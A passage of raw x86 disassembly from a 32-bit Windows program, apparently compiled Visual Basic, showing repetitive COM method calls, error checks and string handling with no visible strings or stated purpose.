  4063ca:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  4063d0:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4063d3:	50                   	push   %eax
  4063d4:	52                   	push   %edx
  4063d5:	ff d3                	call   *%ebx
  4063d7:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4063dd:	8b 06                	mov    (%esi),%eax
  4063df:	56                   	push   %esi
  4063e0:	ff 90 08 03 00 00    	call   *0x308(%eax)
  4063e6:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4063e9:	50                   	push   %eax
  4063ea:	51                   	push   %ecx
  4063eb:	ff d3                	call   *%ebx
  4063ed:	8b 10                	mov    (%eax),%edx
  4063ef:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4063f2:	51                   	push   %ecx
  4063f3:	50                   	push   %eax
  4063f4:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  4063fa:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  406400:	85 c0                	test   %eax,%eax
  406402:	db e2                	fnclex
  406404:	7d 18                	jge    0x40641e
  406406:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  40640c:	68 a0 00 00 00       	push   $0xa0
  406411:	68 84 2a 40 00       	push   $0x402a84
  406416:	52                   	push   %edx
  406417:	50                   	push   %eax
  406418:	ff 15 38 10 40 00    	call   *0x401038
  40641e:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406421:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  406427:	89 45 98             	mov    %eax,-0x68(%ebp)
  40642a:	b8 08 00 00 00       	mov    $0x8,%eax
  40642f:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  406432:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  406439:	89 45 90             	mov    %eax,-0x70(%ebp)
  40643c:	c7 85 58 ff ff ff d0 	movl   $0x402cd0,-0xa8(%ebp)
  406443:	2c 40 00 
  406446:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  40644c:	ff 15 e8 10 40 00    	call   *0x4010e8
  406452:	c7 85 68 ff ff ff c8 	movl   $0x402cc8,-0x98(%ebp)
  406459:	2c 40 00 
  40645c:	e9 de ee ff ff       	jmp    0x40533f
  406461:	8b 16                	mov    (%esi),%edx
  406463:	56                   	push   %esi
  406464:	ff 92 08 03 00 00    	call   *0x308(%edx)
  40646a:	50                   	push   %eax
  40646b:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40646e:	50                   	push   %eax
  40646f:	ff d3                	call   *%ebx
  406471:	8b 0e                	mov    (%esi),%ecx
  406473:	56                   	push   %esi
  406474:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40647a:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  406480:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  406483:	50                   	push   %eax
  406484:	52                   	push   %edx
  406485:	ff d3                	call   *%ebx
  406487:	8b 08                	mov    (%eax),%ecx
  406489:	8d 55 dc             	lea    -0x24(%ebp),%edx
  40648c:	52                   	push   %edx
  40648d:	50                   	push   %eax
  40648e:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  406494:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  40649a:	85 c0                	test   %eax,%eax
  40649c:	db e2                	fnclex
  40649e:	7d 18                	jge    0x4064b8
  4064a0:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  4064a6:	68 a0 00 00 00       	push   $0xa0
  4064ab:	68 84 2a 40 00       	push   $0x402a84
  4064b0:	51                   	push   %ecx
  4064b1:	50                   	push   %eax
  4064b2:	ff 15 38 10 40 00    	call   *0x401038
  4064b8:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4064bb:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  4064c1:	89 45 98             	mov    %eax,-0x68(%ebp)
  4064c4:	b8 08 00 00 00       	mov    $0x8,%eax
  4064c9:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4064cc:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4064d3:	89 45 90             	mov    %eax,-0x70(%ebp)
  4064d6:	c7 85 58 ff ff ff e0 	movl   $0x402ce0,-0xa8(%ebp)
  4064dd:	2c 40 00 
  4064e0:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  4064e6:	ff 15 e8 10 40 00    	call   *0x4010e8
  4064ec:	c7 85 68 ff ff ff d8 	movl   $0x402cd8,-0x98(%ebp)
  4064f3:	2c 40 00 
  4064f6:	8d 95 60 ff ff ff    	lea    -0xa0(%ebp),%edx
  4064fc:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4064ff:	c7 85 60 ff ff ff 08 	movl   $0x8,-0xa0(%ebp)
  406506:	00 00 00 
  406509:	ff 15 e8 10 40 00    	call   *0x4010e8
  40650f:	33 d2                	xor    %edx,%edx
  406511:	81 ff 00 80 ff ff    	cmp    $0xffff8000,%edi
  406517:	0f 94 c2             	sete   %dl
  40651a:	f7 da                	neg    %edx
  40651c:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40651f:	66 89 95 78 ff ff ff 	mov    %dx,-0x88(%ebp)
  406526:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  406529:	50                   	push   %eax
  40652a:	8d 95 70 ff ff ff    	lea    -0x90(%ebp),%edx
  406530:	51                   	push   %ecx
  406531:	8d 45 a0             	lea    -0x60(%ebp),%eax
  406534:	52                   	push   %edx
  406535:	50                   	push   %eax
  406536:	c7 85 70 ff ff ff 0b 	movl   $0xb,-0x90(%ebp)
  40653d:	00 00 00 
  406540:	ff 15 cc 10 40 00    	call   *0x4010cc
  406546:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  40654c:	8d 55 90             	lea    -0x70(%ebp),%edx
  40654f:	8d 45 a0             	lea    -0x60(%ebp),%eax
  406552:	52                   	push   %edx
  406553:	8b 39                	mov    (%ecx),%edi
  406555:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  406558:	50                   	push   %eax
  406559:	51                   	push   %ecx
  40655a:	ff 15 b0 10 40 00    	call   *0x4010b0
  406560:	8d 55 d8             	lea    -0x28(%ebp),%edx
  406563:	50                   	push   %eax
  406564:	52                   	push   %edx
  406565:	ff 15 a8 10 40 00    	call   *0x4010a8
  40656b:	50                   	push   %eax
  40656c:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  406572:	50                   	push   %eax
  406573:	ff 97 a4 00 00 00    	call   *0xa4(%edi)
  406579:	85 c0                	test   %eax,%eax
  40657b:	db e2                	fnclex
  40657d:	0f 8d 84 ef ff ff    	jge    0x405507
  406583:	e9 67 ef ff ff       	jmp    0x4054ef
  406588:	8b 0e                	mov    (%esi),%ecx
  40658a:	56                   	push   %esi
  40658b:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  406591:	8d 55 d0             	lea    -0x30(%ebp),%edx
  406594:	50                   	push   %eax
  406595:	52                   	push   %edx
  406596:	ff d3                	call   *%ebx
  406598:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40659e:	8b 06                	mov    (%esi),%eax
  4065a0:	56                   	push   %esi
  4065a1:	ff 90 08 03 00 00    	call   *0x308(%eax)
  4065a7:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4065aa:	50                   	push   %eax
  4065ab:	51                   	push   %ecx
  4065ac:	ff d3                	call   *%ebx
  4065ae:	8b 10                	mov    (%eax),%edx
  4065b0:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4065b3:	51                   	push   %ecx
  4065b4:	50                   	push   %eax
  4065b5:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  4065bb:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  4065c1:	85 c0                	test   %eax,%eax
  4065c3:	db e2                	fnclex
  4065c5:	7d 18                	jge    0x4065df
  4065c7:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  4065cd:	68 a0 00 00 00       	push   $0xa0
  4065d2:	68 84 2a 40 00       	push   $0x402a84
  4065d7:	52                   	push   %edx
  4065d8:	50                   	push   %eax
  4065d9:	ff 15 38 10 40 00    	call   *0x401038
  4065df:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4065e2:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  4065e8:	89 45 98             	mov    %eax,-0x68(%ebp)
  4065eb:	b8 08 00 00 00       	mov    $0x8,%eax
  4065f0:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4065f3:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4065fa:	89 45 90             	mov    %eax,-0x70(%ebp)
  4065fd:	c7 85 58 ff ff ff e8 	movl   $0x402ce8,-0xa8(%ebp)
  406604:	2c 40 00 
  406607:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  40660d:	ff 15 e8 10 40 00    	call   *0x4010e8
  406613:	c7 85 68 ff ff ff bc 	movl   $0x4024bc,-0x98(%ebp)
  40661a:	24 40 00 
  40661d:	e9 1d ed ff ff       	jmp    0x40533f
  406622:	8b 16                	mov    (%esi),%edx
  406624:	56                   	push   %esi
  406625:	ff 92 08 03 00 00    	call   *0x308(%edx)
  40662b:	50                   	push   %eax
  40662c:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40662f:	50                   	push   %eax
  406630:	ff d3                	call   *%ebx
  406632:	8b 0e                	mov    (%esi),%ecx
  406634:	56                   	push   %esi
  406635:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40663b:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  406641:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  406644:	50                   	push   %eax
  406645:	52                   	push   %edx
  406646:	ff d3                	call   *%ebx
  406648:	8b 08                	mov    (%eax),%ecx
  40664a:	8d 55 dc             	lea    -0x24(%ebp),%edx
  40664d:	52                   	push   %edx
  40664e:	50                   	push   %eax
  40664f:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  406655:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  40665b:	85 c0                	test   %eax,%eax
  40665d:	db e2                	fnclex
  40665f:	7d 18                	jge    0x406679
  406661:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  406667:	68 a0 00 00 00       	push   $0xa0
  40666c:	68 84 2a 40 00       	push   $0x402a84
  406671:	51                   	push   %ecx
  406672:	50                   	push   %eax
  406673:	ff 15 38 10 40 00    	call   *0x401038
  406679:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40667c:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  406682:	89 45 98             	mov    %eax,-0x68(%ebp)
  406685:	b8 08 00 00 00       	mov    $0x8,%eax
  40668a:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  40668d:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  406694:	89 45 90             	mov    %eax,-0x70(%ebp)
  406697:	c7 85 58 ff ff ff f8 	movl   $0x402cf8,-0xa8(%ebp)
  40669e:	2c 40 00 
  4066a1:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  4066a7:	ff 15 e8 10 40 00    	call   *0x4010e8
  4066ad:	8d 95 60 ff ff ff    	lea    -0xa0(%ebp),%edx
  4066b3:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4066b6:	c7 85 68 ff ff ff f0 	movl   $0x402cf0,-0x98(%ebp)
  4066bd:	2c 40 00 
  4066c0:	c7 85 60 ff ff ff 08 	movl   $0x8,-0xa0(%ebp)
  4066c7:	00 00 00 
  4066ca:	ff 15 e8 10 40 00    	call   *0x4010e8
  4066d0:	33 d2                	xor    %edx,%edx
  4066d2:	81 ff 00 80 ff ff    	cmp    $0xffff8000,%edi
  4066d8:	0f 94 c2             	sete   %dl
  4066db:	f7 da                	neg    %edx
  4066dd:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4066e0:	66 89 95 78 ff ff ff 	mov    %dx,-0x88(%ebp)
  4066e7:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4066ea:	50                   	push   %eax
  4066eb:	8d 95 70 ff ff ff    	lea    -0x90(%ebp),%edx
  4066f1:	51                   	push   %ecx
  4066f2:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4066f5:	52                   	push   %edx
  4066f6:	50                   	push   %eax
  4066f7:	c7 85 70 ff ff ff 0b 	movl   $0xb,-0x90(%ebp)
  4066fe:	00 00 00 
  406701:	ff 15 cc 10 40 00    	call   *0x4010cc
  406707:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  40670d:	8d 55 90             	lea    -0x70(%ebp),%edx
  406710:	8d 45 a0             	lea    -0x60(%ebp),%eax
  406713:	52                   	push   %edx
  406714:	8b 39                	mov    (%ecx),%edi
  406716:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  406719:	50                   	push   %eax
  40671a:	51                   	push   %ecx
  40671b:	ff 15 b0 10 40 00    	call   *0x4010b0
  406721:	8d 55 d8             	lea    -0x28(%ebp),%edx
  406724:	50                   	push   %eax
  406725:	52                   	push   %edx
  406726:	ff 15 a8 10 40 00    	call   *0x4010a8
  40672c:	50                   	push   %eax
  40672d:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  406733:	50                   	push   %eax
  406734:	ff 97 a4 00 00 00    	call   *0xa4(%edi)
  40673a:	85 c0                	test   %eax,%eax
  40673c:	db e2                	fnclex
  40673e:	7d 18                	jge    0x406758
  406740:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  406746:	68 a4 00 00 00       	push   $0xa4
  40674b:	68 84 2a 40 00       	push   $0x402a84
  406750:	51                   	push   %ecx
  406751:	50                   	push   %eax
  406752:	ff 15 38 10 40 00    	call   *0x401038
  406758:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40675b:	ff 15 08 11 40 00    	call   *0x401108
  406761:	8d 55 d0             	lea    -0x30(%ebp),%edx
  406764:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  406767:	52                   	push   %edx
  406768:	50                   	push   %eax
  406769:	6a 02                	push   $0x2
  40676b:	ff 15 24 10 40 00    	call   *0x401024
  406771:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  406774:	8d 55 a0             	lea    -0x60(%ebp),%edx
  406777:	51                   	push   %ecx
  406778:	8d 45 90             	lea    -0x70(%ebp),%eax
  40677b:	52                   	push   %edx
  40677c:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  40677f:	50                   	push   %eax
  406780:	8d 55 c0             	lea    -0x40(%ebp),%edx
  406783:	51                   	push   %ecx
  406784:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  40678a:	52                   	push   %edx
  40678b:	50                   	push   %eax
  40678c:	6a 06                	push   $0x6
  40678e:	ff 15 1c 10 40 00    	call   *0x40101c
  406794:	83 c4 28             	add    $0x28,%esp
  406797:	e9 4c 0d 00 00       	jmp    0x4074e8
  40679c:	8b 0e                	mov    (%esi),%ecx
  40679e:	56                   	push   %esi
  40679f:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  4067a5:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4067a8:	50                   	push   %eax
  4067a9:	52                   	push   %edx
  4067aa:	ff d3                	call   *%ebx
  4067ac:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4067b2:	8b 06                	mov    (%esi),%eax
  4067b4:	56                   	push   %esi
  4067b5:	ff 90 08 03 00 00    	call   *0x308(%eax)
  4067bb:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4067be:	50                   	push   %eax
  4067bf:	51                   	push   %ecx
  4067c0:	ff d3                	call   *%ebx
  4067c2:	8b 10                	mov    (%eax),%edx
  4067c4:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4067c7:	51                   	push   %ecx
  4067c8:	50                   	push   %eax
  4067c9:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  4067cf:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  4067d5:	85 c0                	test   %eax,%eax
  4067d7:	db e2                	fnclex
  4067d9:	7d 18                	jge    0x4067f3
  4067db:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  4067e1:	68 a0 00 00 00       	push   $0xa0
  4067e6:	68 84 2a 40 00       	push   $0x402a84
  4067eb:	52                   	push   %edx
  4067ec:	50                   	push   %eax
  4067ed:	ff 15 38 10 40 00    	call   *0x401038
  4067f3:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4067f6:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  4067fc:	89 45 98             	mov    %eax,-0x68(%ebp)
  4067ff:	b8 08 00 00 00       	mov    $0x8,%eax
  406804:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  406807:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40680e:	89 45 90             	mov    %eax,-0x70(%ebp)
  406811:	c7 85 58 ff ff ff 08 	movl   $0x402d08,-0xa8(%ebp)
  406818:	2d 40 00 
  40681b:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  406821:	ff 15 e8 10 40 00    	call   *0x4010e8
  406827:	8d 95 60 ff ff ff    	lea    -0xa0(%ebp),%edx
  40682d:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  406830:	c7 85 68 ff ff ff 00 	movl   $0x402d00,-0x98(%ebp)
  406837:	2d 40 00 
  40683a:	c7 85 60 ff ff ff 08 	movl   $0x8,-0xa0(%ebp)
  406841:	00 00 00 
  406844:	ff 15 e8 10 40 00    	call   *0x4010e8
  40684a:	33 c0                	xor    %eax,%eax
  40684c:	81 ff 00 80 ff ff    	cmp    $0xffff8000,%edi
  406852:	0f 94 c0             	sete   %al
  406855:	f7 d8                	neg    %eax
  406857:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  40685a:	66 89 85 78 ff ff ff 	mov    %ax,-0x88(%ebp)
  406861:	8d 55 c0             	lea    -0x40(%ebp),%edx
  406864:	51                   	push   %ecx
  406865:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  40686b:	52                   	push   %edx
  40686c:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  40686f:	50                   	push   %eax
  406870:	51                   	push   %ecx
  406871:	c7 85 70 ff ff ff 0b 	movl   $0xb,-0x90(%ebp)
  406878:	00 00 00 
  40687b:	ff 15 cc 10 40 00    	call   *0x4010cc
  406881:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  406887:	8d 45 90             	lea    -0x70(%ebp),%eax
  40688a:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  40688d:	50                   	push   %eax
  40688e:	8b 3a                	mov    (%edx),%edi
  406890:	8d 55 80             	lea    -0x80(%ebp),%edx
  406893:	51                   	push   %ecx
  406894:	52                   	push   %edx
  406895:	ff 15 b0 10 40 00    	call   *0x4010b0
  40689b:	50                   	push   %eax
  40689c:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40689f:	50                   	push   %eax
  4068a0:	ff 15 a8 10 40 00    	call   *0x4010a8
  4068a6:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  4068ac:	50                   	push   %eax
  4068ad:	51                   	push   %ecx
  4068ae:	ff 97 a4 00 00 00    	call   *0xa4(%edi)
  4068b4:	85 c0                	test   %eax,%eax
  4068b6:	db e2                	fnclex
  4068b8:	7d 18                	jge    0x4068d2
  4068ba:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  4068c0:	68 a4 00 00 00       	push   $0xa4
  4068c5:	68 84 2a 40 00       	push   $0x402a84
  4068ca:	52                   	push   %edx
  4068cb:	50                   	push   %eax
  4068cc:	ff 15 38 10 40 00    	call   *0x401038
  4068d2:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4068d5:	ff 15 08 11 40 00    	call   *0x401108
  4068db:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4068de:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4068e1:	50                   	push   %eax
  4068e2:	51                   	push   %ecx
  4068e3:	6a 02                	push   $0x2
  4068e5:	ff 15 24 10 40 00    	call   *0x401024
  4068eb:	8d 55 80             	lea    -0x80(%ebp),%edx
  4068ee:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4068f1:	52                   	push   %edx
  4068f2:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  4068f5:	50                   	push   %eax
  4068f6:	8d 55 b0             	lea    -0x50(%ebp),%edx
  4068f9:	51                   	push   %ecx
  4068fa:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4068fd:	52                   	push   %edx
  4068fe:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  406904:	50                   	push   %eax
  406905:	51                   	push   %ecx
  406906:	6a 06                	push   $0x6
  406908:	ff 15 1c 10 40 00    	call   *0x40101c
  40690e:	83 c4 28             	add    $0x28,%esp
  406911:	e9 d2 0b 00 00       	jmp    0x4074e8
  406916:	8b 16                	mov    (%esi),%edx
  406918:	56                   	push   %esi
  406919:	ff 92 08 03 00 00    	call   *0x308(%edx)
  40691f:	50                   	push   %eax
  406920:	8d 45 d0             	lea    -0x30(%ebp),%eax
  406923:	50                   	push   %eax
  406924:	ff d3                	call   *%ebx
  406926:	8b 0e                	mov    (%esi),%ecx
  406928:	56                   	push   %esi
  406929:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40692f:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  406935:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  406938:	50                   	push   %eax
  406939:	52                   	push   %edx
  40693a:	ff d3                	call   *%ebx
  40693c:	8b f8                	mov    %eax,%edi
  40693e:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  406941:	51                   	push   %ecx
  406942:	57                   	push   %edi
  406943:	8b 07                	mov    (%edi),%eax
  406945:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  40694b:	85 c0                	test   %eax,%eax
  40694d:	db e2                	fnclex
  40694f:	7d 12                	jge    0x406963
  406951:	68 a0 00 00 00       	push   $0xa0
  406956:	68 84 2a 40 00       	push   $0x402a84
  40695b:	57                   	push   %edi
  40695c:	50                   	push   %eax
  40695d:	ff 15 38 10 40 00    	call   *0x401038
  406963:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406966:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  40696c:	50                   	push   %eax
  40696d:	68 10 2d 40 00       	push   $0x402d10
  406972:	8b 3a                	mov    (%edx),%edi
  406974:	ff 15 30 10 40 00    	call   *0x401030
  40697a:	8b d0                	mov    %eax,%edx
  40697c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40697f:	ff 15 f0 10 40 00    	call   *0x4010f0
  406985:	8b cf                	mov    %edi,%ecx
  406987:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  40698d:	50                   	push   %eax
  40698e:	57                   	push   %edi
  40698f:	e9 13 09 00 00       	jmp    0x4072a7
  406994:	8b 06                	mov    (%esi),%eax
  406996:	56                   	push   %esi
  406997:	ff 90 08 03 00 00    	call   *0x308(%eax)
  40699d:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4069a0:	50                   	push   %eax
  4069a1:	51                   	push   %ecx
  4069a2:	ff d3                	call   *%ebx
  4069a4:	8b 16                	mov    (%esi),%edx
  4069a6:	56                   	push   %esi
  4069a7:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4069ad:	ff 92 08 03 00 00    	call   *0x308(%edx)
  4069b3:	50                   	push   %eax
  4069b4:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4069b7:	50                   	push   %eax
  4069b8:	ff d3                	call   *%ebx
  4069ba:	8b f8                	mov    %eax,%edi
  4069bc:	8d 55 dc             	lea    -0x24(%ebp),%edx
  4069bf:	52                   	push   %edx
  4069c0:	57                   	push   %edi
  4069c1:	8b 0f                	mov    (%edi),%ecx
  4069c3:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  4069c9:	85 c0                	test   %eax,%eax
  4069cb:	db e2                	fnclex
  4069cd:	7d 12                	jge    0x4069e1
  4069cf:	68 a0 00 00 00       	push   $0xa0
  4069d4:	68 84 2a 40 00       	push   $0x402a84
  4069d9:	57                   	push   %edi
  4069da:	50                   	push   %eax
  4069db:	ff 15 38 10 40 00    	call   *0x401038
  4069e1:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4069e4:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  4069ea:	51                   	push   %ecx
  4069eb:	68 28 2d 40 00       	push   $0x402d28
  4069f0:	8b 38                	mov    (%eax),%edi
  4069f2:	ff 15 30 10 40 00    	call   *0x401030
  4069f8:	8b d0                	mov    %eax,%edx
  4069fa:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4069fd:	ff 15 f0 10 40 00    	call   *0x4010f0
  406a03:	8b d7                	mov    %edi,%edx
  406a05:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  406a0b:	50                   	push   %eax
  406a0c:	57                   	push   %edi
  406a0d:	e9 df e0 ff ff       	jmp    0x404af1
  406a12:	8b 0e                	mov    (%esi),%ecx
  406a14:	56                   	push   %esi
  406a15:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  406a1b:	8d 55 d0             	lea    -0x30(%ebp),%edx
  406a1e:	50                   	push   %eax
  406a1f:	52                   	push   %edx
  406a20:	ff d3                	call   *%ebx
  406a22:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406a28:	8b 06                	mov    (%esi),%eax
  406a2a:	56                   	push   %esi
  406a2b:	ff 90 08 03 00 00    	call   *0x308(%eax)
  406a31:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  406a34:	50                   	push   %eax
  406a35:	51                   	push   %ecx
  406a36:	ff d3                	call   *%ebx
  406a38:	8b f8                	mov    %eax,%edi
  406a3a:	8d 45 dc             	lea    -0x24(%ebp),%eax
  406a3d:	50                   	push   %eax
  406a3e:	57                   	push   %edi
  406a3f:	8b 17                	mov    (%edi),%edx
  406a41:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  406a47:	85 c0                	test   %eax,%eax
  406a49:	db e2                	fnclex
  406a4b:	7d 12                	jge    0x406a5f
  406a4d:	68 a0 00 00 00       	push   $0xa0
  406a52:	68 84 2a 40 00       	push   $0x402a84
  406a57:	57                   	push   %edi
  406a58:	50                   	push   %eax
  406a59:	ff 15 38 10 40 00    	call   *0x401038
  406a5f:	8b 55 dc             	mov    -0x24(%ebp),%edx
  406a62:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  406a68:	52                   	push   %edx
  406a69:	68 3c 2d 40 00       	push   $0x402d3c
  406a6e:	8b 39                	mov    (%ecx),%edi
  406a70:	ff 15 30 10 40 00    	call   *0x401030
  406a76:	8b d0                	mov    %eax,%edx
  406a78:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406a7b:	ff 15 f0 10 40 00    	call   *0x4010f0
  406a81:	89 bd 3c fe ff ff    	mov    %edi,-0x1c4(%ebp)
  406a87:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  406a8d:	50                   	push   %eax
  406a8e:	8b 85 3c fe ff ff    	mov    -0x1c4(%ebp),%eax
  406a94:	57                   	push   %edi
  406a95:	e9 ef e0 ff ff       	jmp    0x404b89
  406a9a:	8b 16                	mov    (%esi),%edx
  406a9c:	56                   	push   %esi
  406a9d:	ff 92 08 03 00 00    	call   *0x308(%edx)
  406aa3:	50                   	push   %eax
  406aa4:	8d 45 d0             	lea    -0x30(%ebp),%eax
  406aa7:	50                   	push   %eax
  406aa8:	ff d3                	call   *%ebx
  406aaa:	8b 0e                	mov    (%esi),%ecx
  406aac:	56                   	push   %esi
  406aad:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406ab3:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  406ab9:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  406abc:	50                   	push   %eax
  406abd:	52                   	push   %edx
  406abe:	ff d3                	call   *%ebx
  406ac0:	8b f8                	mov    %eax,%edi
  406ac2:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  406ac5:	51                   	push   %ecx
  406ac6:	57                   	push   %edi
  406ac7:	8b 07                	mov    (%edi),%eax
  406ac9:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  406acf:	85 c0                	test   %eax,%eax
  406ad1:	db e2                	fnclex
  406ad3:	7d 12                	jge    0x406ae7
  406ad5:	68 a0 00 00 00       	push   $0xa0
  406ada:	68 84 2a 40 00       	push   $0x402a84
  406adf:	57                   	push   %edi
  406ae0:	50                   	push   %eax
  406ae1:	ff 15 38 10 40 00    	call   *0x401038
  406ae7:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406aea:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  406af0:	50                   	push   %eax
  406af1:	68 50 2d 40 00       	push   $0x402d50
  406af6:	8b 3a                	mov    (%edx),%edi
  406af8:	ff 15 30 10 40 00    	call   *0x401030
  406afe:	8b d0                	mov    %eax,%edx
  406b00:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406b03:	ff 15 f0 10 40 00    	call   *0x4010f0
  406b09:	8b cf                	mov    %edi,%ecx
  406b0b:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  406b11:	50                   	push   %eax
  406b12:	57                   	push   %edi
  406b13:	e9 8f 07 00 00       	jmp    0x4072a7
  406b18:	8b 06                	mov    (%esi),%eax
  406b1a:	56                   	push   %esi
